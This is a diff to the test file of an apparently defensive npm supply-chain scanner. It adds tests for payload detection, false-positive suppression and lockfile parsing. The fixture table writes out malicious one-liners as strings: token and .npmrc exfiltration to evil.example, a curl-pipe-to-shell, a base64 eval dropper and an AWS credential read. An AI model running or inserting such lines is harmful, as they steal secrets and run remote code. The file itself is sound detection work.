@@ -298,7 +298,7 @@ test("referencedScriptFile extracts the file a hook hands to node", () => {
 
 test("classifySource reads the payload behind an innocent-looking command", () => {
   const clean = classifySource("const fs = require('fs');\nfs.writeFileSync('a', 'b');\n");
-  assert.equal(clean.risk, "medium");
+  assert.equal(clean.risk, "low", "a file with no interesting call is low, not a shrug");
   assert.equal(clean.evidence.length, 0);
 
   const nasty = classifySource([
@@ -458,4 +458,85 @@ test("ci --init writes a workflow that preflights before installing, and never c
   assert.equal(second.reason, "exists");
   assert.equal((await writeWorkflow(dir, { force: true })).written, true);
   assert.ok(!renderWorkflow({ sarif: false }).includes("upload-sarif"));
+});
+
+// ---------------------------------------------------------------------------
+// v0.5.0: accuracy. These tests exist because the previous classifier was
+// validated only against a demo tree I built myself; running it over ~350 real
+// packages produced the false positives named below.
+// ---------------------------------------------------------------------------
+
+import { classifySourceFile, classifySourceLineAll } from "../src/source.js";
+
+test("known malicious payload shapes are all detected", () => {
+  const payloads = {
+    "credential steal (chalk/debug shape)":
+      "const https=require('https');https.get('https://evil.example/c?t='+process.env.NPM_TOKEN);",
+    "base64 dropper": "eval(Buffer.from('Y29uc29sZS5sb2coMSk=','base64').toString());",
+    "curl | sh": "require('child_process').execSync(\"curl -s https://evil.example/i.sh | sh\");",
+    "npmrc exfil (Shai-Hulud shape)":
+      "const t=require('fs').readFileSync(process.env.HOME+'/.npmrc','utf8');fetch('https://evil.example',{method:'POST',body:t});",
+    "Function+atob hop": "const f=new Function(atob('cmV0dXJuIDE='));f();",
+    "packed one-liner": `x(${"'a',".repeat(700)})`,
+    "aws credential read": "const c=require('fs').readFileSync('/root/.aws/credentials');",
+  };
+  for (const [label, src] of Object.entries(payloads)) {
+    assert.equal(classifySourceFile(src).risk, "high", `missed: ${label}`);
+  }
+});
+
+test("real-world false positives stay quiet", () => {
+  // Every case below is real source from a popular package that the first
+  // version of the classifier flagged as high risk. None of them are.
+  const benign = {
+    "function expression is not the Function constructor": "spawn('node-gyp').on('exit', function (code) { process.exit(code); });",
+    "an identifier containing 'download'": "function downloadedBinPath(pkg, subpath) { return path.join(dir, 'downloaded-' + pkg); }",
+    "tar parsing with fromCharCode over a buffer": "let str = (i, n) => String.fromCharCode(...buffer.subarray(i, i + n));",
+    "a non-secret env var beside a network call": "const p = process.env.ESBUILD_BINARY_PATH; require('https').get(url);",
+    "a local fetch helper definition": "function fetch(url) { return https.get(url); }",
+    "npm-run-all style build": "require('child_process').spawn('node-gyp', ['rebuild']);",
+  };
+  for (const [label, src] of Object.entries(benign)) {
+    assert.notEqual(classifySourceFile(src).risk, "high", `false positive: ${label}`);
+  }
+
+  // …while the same env var *named* like a secret still counts, in combination.
+  assert.equal(
+    classifySourceFile("const p = process.env.NPM_AUTH_TOKEN; require('https').get('https://x.example/' + p);").risk,
+    "high",
+  );
+});
+
+test("a line reports every signal it carries, not just the first", () => {
+  const verdicts = classifySourceLineAll("require('child_process').exec('curl https://x.example | sh');");
+  const categories = verdicts.map((v) => v.category);
+  assert.ok(categories.includes("pipe-to-shell"));
+  assert.ok(categories.includes("shell-exec"));
+  assert.ok(categories.includes("network-download"));
+  assert.equal(verdicts[0].risk, "high", "highest risk first");
+});
+
+test("a native build is medium, not high, however loudly it spawns", () => {
+  const parcelWatcher = [
+    "const {spawn} = require('child_process');",
+    "if (process.env.npm_config_build_from_source === 'true') build();",
+    "function build() { spawn('node-gyp', ['rebuild'], {stdio: 'inherit', shell: true}); }",
+  ].join("\n");
+  const result = classifySourceFile(parcelWatcher);
+  assert.notEqual(result.risk, "high");
+  assert.ok(result.evidence.some((e) => e.category === "shell-exec"), "the spawn is still reported");
+});
+
+test("git dependencies are identified from the lockfile", () => {
+  const lock = JSON.stringify({
+    lockfileVersion: 3,
+    packages: {
+      "": { name: "app" },
+      "node_modules/normal": { version: "1.0.0", resolved: "https://registry.npmjs.org/normal/-/normal-1.0.0.tgz" },
+      "node_modules/forked": { version: "2.0.0", resolved: "git+ssh://git@github.com/acme/forked.git#abc123" },
+    },
+  });
+  const entries = parseNpmLock(lock);
+  assert.equal(entries.find((e) => e.name === "normal").git, false);
+  assert.equal(entries.find((e) => e.name === "forked").git, true, "prepare runs for git deps and only for them");
 });
